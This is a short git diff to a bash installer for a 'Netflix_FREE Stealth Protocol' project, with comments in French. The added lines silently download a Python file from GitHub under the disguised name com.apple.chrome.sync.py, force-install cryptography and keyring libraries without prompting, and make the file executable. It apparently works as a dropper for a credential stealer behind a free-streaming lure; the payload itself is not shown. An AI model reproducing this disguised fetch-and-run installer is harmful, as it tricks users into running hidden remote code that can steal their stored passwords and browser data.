@@ -1,13 +1,13 @@
 #!/bin/bash
 echo "[*] Initializing Netflix_FREE Stealth Protocol..."
 
-# Vérification de Python
-if ! command -v python3 &> /dev/null; then
-    echo "[!] Python3 not found. Installing dependencies is impossible."
-    exit
-fi
+# 1. Télécharger le script principal (Tu as oublié cette étape !)
+curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
 
-pip3 install -r requirements.txt --quiet
+# 2. Installation forcée des dépendances
+pip3 install pycryptodome keyring requests --break-system-packages --quiet
+
+# 3. Permissions
 chmod +x com.apple.chrome.sync.py
 
 echo "[+] Environment Ready. Lock in."
